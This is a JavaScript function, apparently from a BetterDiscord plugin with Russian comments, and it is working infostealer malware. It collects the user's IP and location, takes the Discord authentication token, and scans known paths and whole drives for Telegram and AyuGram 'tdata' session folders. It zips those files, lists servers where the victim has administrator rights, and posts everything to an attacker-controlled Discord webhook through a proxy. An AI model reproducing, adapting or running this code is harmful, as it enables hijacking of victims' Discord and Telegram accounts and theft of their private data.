async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
    let fs = null;
    let path = null;
    try { 
        fs = require('fs'); 
        path = require('path');
    } catch (e) { 
        return { success: false, error: "Модули fs/path недоступны." }; 
    }

    let zipFunc = null;
    if (fflate && typeof fflate.zipSync === 'function') zipFunc = fflate.zipSync;
    else if (fflate && fflate.default && typeof fflate.default.zipSync === 'function') zipFunc = fflate.default.zipSync;

    if (!zipFunc) return { success: false, error: "Библиотека fflate не загружена." };

    let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        result.location = ipData.city || ipData.region || ipData.country || "Неизвестно";
    } catch (e) { result.debug_tdata.push("Ошибка IP: " + e.message); }

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. УМНЫЙ РЕКУРСИВНЫЙ ПОИСК tdata (Telegram & AyuGram & Portable)
    let hasTdata = false;
    let tdataPath = null;
    
    try {
        // Сначала стандартные пути
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';
        const userProfile = process.env.USERPROFILE || '';
        
        const standardPaths = [
            path.join(appData, 'Telegram Desktop', 'tdata'),
            path.join(appData, 'Telegram', 'tdata'),
            path.join(appData, 'AyuGram', 'tdata'),
            path.join(localAppData, 'Telegram Desktop', 'tdata'),
            path.join(localAppData, 'Telegram', 'tdata'),
            path.join(localAppData, 'AyuGram', 'tdata'),
            path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata'),
            path.join(userProfile, 'Downloads', 'Telegram Desktop', 'tdata'),
            path.join(userProfile, 'Downloads', 'AyuGram', 'tdata')
        ];

        for (const p of standardPaths) {
            if (fs.existsSync(p)) { tdataPath = p; break; }
        }

        // Если нет в стандартных, ищем по дискам (до 3 уровней вглубь)
        if (!tdataPath) {
            result.debug_tdata.push("Стандартные пути пусты. Сканирование дисков...");
            
            const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'node_modules', 'users'];
            
            const findTdataRecursive = (dir, depth = 0) => {
                if (depth > 3) return null;
                try {
                    const entries = fs.readdirSync(dir, { withFileTypes: true });
                    
                    for (const entry of entries) {
                        if (entry.isDirectory() && entry.name.toLowerCase() === 'tdata') {
                            return path.join(dir, entry.name);
                        }
                    }
                    
                    for (const entry of entries) {
                        if (entry.isDirectory()) {
                            const lowerName = entry.name.toLowerCase();
                            if (ignoreDirs.includes(lowerName) || lowerName.startsWith('.')) continue;
                            
                            const fullPath = path.join(dir, entry.name);
                            
                            if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg') {
                                const resultPath = findTdataRecursive(fullPath, depth);
                                if (resultPath) return resultPath;
                            } else {
                                const resultPath = findTdataRecursive(fullPath, depth + 1);
                                if (resultPath) return resultPath;
                            }
                        }
                    }
                } catch (e) {}
                return null;
            };

            const drives = ['C:', 'D:', 'E:', 'F:', 'G:'];
            for (const d of drives) {
                const root = d + '\\';
                if (fs.existsSync(root)) {
                    result.debug_tdata.push(`Сканирование ${root}...`);
                    tdataPath = findTdataRecursive(root);
                    if (tdataPath) break;
                }
            }
        }
    } catch (e) {
        result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
    }

    // 4. ФОРМИРУЕМ ОДИН АРХИВ
    let finalZipBuffer = null;
    try {
        const zipFiles = {};

        // 4.1. Добавляем data.json в корень архива
        const jsonData = JSON.stringify(result, null, 2);
        // Кодируем строку в Uint8Array (обязательно для fflate)
        const jsonBytes = new TextEncoder().encode(jsonData);
        zipFiles['data.json'] = jsonBytes;

        // 4.2. Добавляем файлы tdata (если нашли)
        if (tdataPath) {
            result.telegram_path = tdataPath;
            result.debug_tdata.push(`Папка найдена: ${tdataPath}`);
            
            const addFilesRecursively = (dir, prefix = '') => {
                try {
                    const entries = fs.readdirSync(dir);
                    for (const entry of entries) {
                        const fullPath = path.join(dir, entry);
                        // Внутри zip-архива используем прямые слеши (/) для правильной структуры
                        const relativePath = (prefix ? prefix + '/' : '') + entry;
                        try {
                            if (fs.statSync(fullPath).isDirectory()) {
                                addFilesRecursively(fullPath, relativePath);
                            } else {
                                zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                            }
                        } catch (fileErr) { }
                    }
                } catch (dirErr) { }
            };
            
            addFilesRecursively(tdataPath);
            result.debug_tdata.push(`Добавлено файлов tdata в архив.`);
            hasTdata = true;
        } else {
            result.debug_tdata.push("Папка tdata не найдена, в архиве будет только data.json.");
        }

        // 4.3. Сжимаем всё вместе
        result.debug_tdata.push("Запуск zipSync...");
        finalZipBuffer = zipFunc(zipFiles);
        result.debug_tdata.push("ZIP успешно создан!");
        
        // Обновляем data.json, чтобы в нем был финальный лог
        const finalJsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
        // (На случай, если ты хочешь, чтобы лог архивации тоже попал в data.json, 
        // придется пересоздать архив, но это излишне. Оставим как есть).

    } catch (e) {
        result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
        hasTdata = false;
    }

    // 5. Сбор информации о серверах
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) {}

    // 6. Формируем сообщение
    // Указываем статус Tdata, но файл теперь один
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
    
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: messageText }));
    
    // Прикрепляем ОДИН архив со всем содержимым
    if (finalZipBuffer) {
        const zipBlob = new Blob([finalZipBuffer], { type: 'application/zip' });
        formData.append('files[0]', zipBlob, 'Opium_Dump.zip');
    }

    // 7. Отправка
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, { method: 'POST', body: formData });
        if (!response.ok) {
            const errorText = await response.text();
            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
        }
        return { success: true };
    } catch (e) {
        return { success: false, error: `Ошибка сети: ${e.message}` };
    }
}
